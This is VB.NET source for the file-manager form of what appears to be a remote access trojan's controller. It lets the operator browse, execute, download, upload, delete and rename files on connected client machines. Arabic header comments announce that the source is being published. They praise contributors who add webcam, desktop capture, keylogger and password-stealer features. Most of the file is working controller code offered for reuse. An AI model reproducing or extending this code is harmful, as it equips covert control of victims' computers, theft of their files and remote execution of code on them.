Public Class File_Manager
    '########################################################################################################
    '################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
    '############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
    '########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
    '################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
    'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
    'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
    'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
    '########################################################################################################
    '#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
    'او حتى password stealer
    '##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
    '############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
    '
    '
    '
    '
    Public key As String
    Protected Friend Sub back()
        If BOXT1.Text.Length < 4 Then : BOXT1.Text = ""
            ListView1.Items.Clear()
            Form1.Send_to_Client("fm_drives" & FUNC.SPL, key)
        Else
            If BOXT1.Text.Contains("/") Then
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("/"))
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("/") + 1)
                Refresh_all()
            ElseIf BOXT1.Text.Contains("\") Then
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("\"))
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("\") + 1)
                Refresh_all()
            End If


        End If

    End Sub

    Private Sub Double_Click() Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Or ListView1.FocusedItem.ImageIndex = 3 Or ListView1.FocusedItem.ImageIndex = 4 Or ListView1.FocusedItem.ImageIndex = 5 Then
            If BOXT1.Text.Length = 0 Then
                BOXT1.Text += ListView1.FocusedItem.Text
            Else
                If BOXT1.Text.Contains("\") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "\"
                ElseIf BOXT1.Text.Contains("/") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "/"
                End If
            End If
            'refresh list 
            Refresh_all()
        Else
            If BOXT1.Text.Length = 0 Then
                BOXT1.Text += ListView1.FocusedItem.Text
            Else
                If BOXT1.Text.Contains("\") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "\"
                ElseIf BOXT1.Text.Contains("/") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "/"
                End If
            End If
            ' refresh list 
            Refresh_all()
            ListView1.Items.Clear()
        End If
    End Sub
    Private Sub Refresh_all()
        ListView1.Items.Clear()
        'refresh
        If BOXT1.Text = "" Then
            Form1.Send_to_Client("fm_drives" & FUNC.SPL, key)
        Else
            ListView1.Items.Clear()
            Me.ListView1.Items.Clear()
            Form1.Send_to_Client("fm_browse" & FUNC.SPL & BOXT1.Text & FUNC.SPL, key)
        End If
    End Sub

    Private Sub File_Manager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Form1.Send_to_Client("fm_drives" & FUNC.SPL, key)
        Refresh_all()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        Refresh_all()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        back()
    End Sub

    Private Sub ExecuteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ExecuteFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            Form1.Send_to_Client("run_fil" & FUNC.SPL & BOXT1.Text & ListView1.SelectedItems(0).Text & FUNC.SPL, key)
        End If

    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownloadFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            Form1.Send_to_Client("sen_me_fil" & FUNC.SPL & BOXT1.Text & ListView1.SelectedItems(0).Text & FUNC.SPL & ListView1.SelectedItems(0).Text & FUNC.SPL, key)
        End If
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UploadFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 0 Then 'Ensure No itm Selected 

            Dim o As New OpenFileDialog
            o.ShowDialog()
            If o.FileName.Length > 0 Then
                Dim n As New IO.FileInfo(o.FileName)
                For Each x As ListViewItem In Form1.L1.SelectedItems
                    ' Form1.s.Send(x.ToolTipText, "sendfileto" & "||" & TextBox1.Text & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                    'Dim file_data As Byte()
                    'Dim file_Data2 As String = System.Text.Encoding.Default.GetString(file_data) 'Convert Temp ByteAry to unknowen string
                    Form1.Send_to_Client("sendfileto" & FUNC.SPL & BOXT1.Text & n.Name & FUNC.SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & FUNC.SPL, key)
                Next
                Refresh_all()
            End If


        End If
    End Sub

    Private Sub OpenDowloadsFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenDowloadsFolderToolStripMenuItem.Click
        If IO.Directory.Exists(Application.StartupPath & "\Downloads") = False Then
            Try
                IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                GoTo Start_Write
            Catch ex As Exception
                MsgBox("Cannot Create Download Dirictory" & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)
            End Try
        Else
Start_Write:
            System.Diagnostics.Process.Start(Application.StartupPath & "\Downloads")
        End If
    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            Dim result As Integer = MessageBox.Show("Are You Sure to Delete " & ListView1.SelectedItems(0).Text, "Confirm Deleting Item", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then
                Form1.Send_to_Client("del_file" & FUNC.SPL & BOXT1.Text & ListView1.SelectedItems(0).Text & FUNC.SPL, key)
                Refresh_all()
            End If
        End If

    End Sub

    Private Sub RenameFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameFileToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            Dim newname As String = InputBox("Enter New Name For : " & ListView1.SelectedItems(0).Text, "New Name Entry", ListView1.SelectedItems(0).Text)
            If newname.Length > 0 Then
                If newname.Equals(ListView1.SelectedItems(0).Text) = False Then
                    If ListView1.SelectedItems(0).ImageIndex = 0 Then 'Send to use method rename file
                        Form1.Send_to_Client("ren_file" & FUNC.SPL & BOXT1.Text & ListView1.SelectedItems(0).Text & FUNC.SPL & BOXT1.Text & newname & FUNC.SPL, key)
                        Refresh_all()
                    ElseIf ListView1.SelectedItems(0).ImageIndex = 1 Then 'chech to send to use methosd rename folder
                        Form1.Send_to_Client("ren_folder" & FUNC.SPL & BOXT1.Text & ListView1.SelectedItems(0).Text & FUNC.SPL & BOXT1.Text & newname & FUNC.SPL, key)
                        Refresh_all()
                    End If
                End If
            End If
        End If

    End Sub

    Private Sub AddNewFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddNewFolderToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 0 Then 'Ensure No itm Selected 
            Dim newname As String = InputBox("Enter New Name For New Folder: ", "New Name Entry", "New Folder")
            If newname.Length > 0 Then
                Form1.Send_to_Client("create_fold" & FUNC.SPL & BOXT1.Text & newname & FUNC.SPL, key)
                Refresh_all()
            End If

        End If
    End Sub
End Class